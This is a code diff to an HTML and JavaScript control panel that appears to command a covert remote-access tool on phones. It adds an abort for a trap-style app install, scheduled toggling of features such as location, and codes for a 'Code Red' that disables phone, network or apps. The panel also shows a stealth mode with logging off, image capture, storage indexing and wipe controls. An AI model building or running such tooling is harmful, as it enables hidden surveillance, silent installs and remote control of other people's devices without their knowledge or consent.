@@ -423,6 +423,7 @@
                     <div class="input-wrap">
                         <button class="btn-tag" onclick="tagCmd('INSTALL_APP', this)">🏷️</button><button class="btn-status" onclick="auditCmd('INSTALL_APP')">?</button>
                         <button class="btn" style="flex:1" onclick="sendCmd('INSTALL_APP')">SPRING THE TRAP</button>
+                        <button class="btn danger" onclick="sendCmd('STOP_INSTALL')" title="Disarm Trap">ABORT</button>
                     </div>
                 </div>
                 <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_SKELETON', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
@@ -447,16 +448,20 @@
                 <div class="cmd-row"><label class="cmd-label">Work Cycle</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('SET_INTERVAL', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_INTERVAL')">?</button><input type="number" id="val-work" placeholder="Mins (Min 15)"><button class="btn" onclick="sendCmd('SET_INTERVAL')">Set</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Logging System (Live Debugger)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('TOGGLE_LOGGING', this)">🏷️</button><button class="btn-status" onclick="auditCmd('TOGGLE_LOGGING')">?</button><select id="log-state" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="ON">SYSTEM_ON (LOGGING)</option><option value="OFF">SYSTEM_OFF (STEALTH)</option></select><button class="btn" onclick="sendCmd('TOGGLE_LOGGING')">Toggle</button></div></div>
                 <div class="cmd-row">
-                    <label class="cmd-label">Feature Control</label>
+                    <label class="cmd-label">Feature Control (Parametric)</label>
                     <div class="input-wrap">
                         <button class="btn-tag" onclick="tagCmd('TOGGLE_FEATURE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('TOGGLE_FEATURE')">?</button>
-                        <input type="text" id="tog-feat" placeholder="Feature (e.g. location)">
+                        <input type="text" id="tog-feat" placeholder="Feature (e.g. location)" style="flex:1">
                         <select id="tog-state" style="background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                             <option value="on">ON</option>
                             <option value="off">OFF</option>
+                            <option value="sched">SCHED</option>
                         </select>
-                        <input type="number" id="tog-dur" value="0" placeholder="Mins" style="width:70px">
-                        <button class="btn" onclick="sendCmd('TOGGLE_FEATURE')">Set</button>
+                    </div>
+                    <div class="input-wrap" style="margin-top:5px">
+                        <input type="text" id="tog-p1" placeholder="Mins / Start (00:00)" style="flex:1">
+                        <input type="text" id="tog-p2" placeholder="End (23:59)" style="flex:1">
+                        <button class="btn" onclick="sendCmd('TOGGLE_FEATURE')">Broadcast</button>
                     </div>
                 </div>
                 <div class="cmd-row">
@@ -484,7 +489,7 @@
             <h2 style="background: var(--danger)" data-search="crisis, panic, nuke, wipe, red, beacon, suicide">Crisis Management</h2>
             <div class="card" style="border-color: var(--danger)">
                 <div class="cmd-row">
-                    <label class="cmd-label">Code Red (Beacon)</label>
+                    <label class="cmd-label">Code Red (0=ALL, 3=PHONE, 8=NET, 9=APPS)</label>
                     <div class="input-wrap">
                         <button class="btn-tag" onclick="tagCmd('CODERED', this)">🏷️</button><button class="btn-status" onclick="auditCmd('CODERED')">?</button>
                         <input type="text" id="cr-code" value="0" placeholder="Codes" style="width:60px">
@@ -805,7 +810,9 @@
                         const depth = document.getElementById('tree-depth').value || '10';
                         content = `${pkg}|${dur}|${depth}`; break;
                     case 'TOGGLE_FEATURE':
-                        content = `${document.getElementById('tog-feat').value}:${document.getElementById('tog-state').value}:${document.getElementById('tog-dur').value}`; break;
+                        content = `${document.getElementById('tog-feat').value}:${document.getElementById('tog-state').value}:${document.getElementById('tog-p1').value}:${document.getElementById('tog-p2').value}`; break;
+                    case 'STOP_INSTALL':
+                        content = ''; break;
                     case 'CODERED':
                         content = `${document.getElementById('cr-code').value}-${document.getElementById('cr-dur').value}-${document.getElementById('cr-freq').value}`; break;
                     case 'CAPTURE_IMAGE':
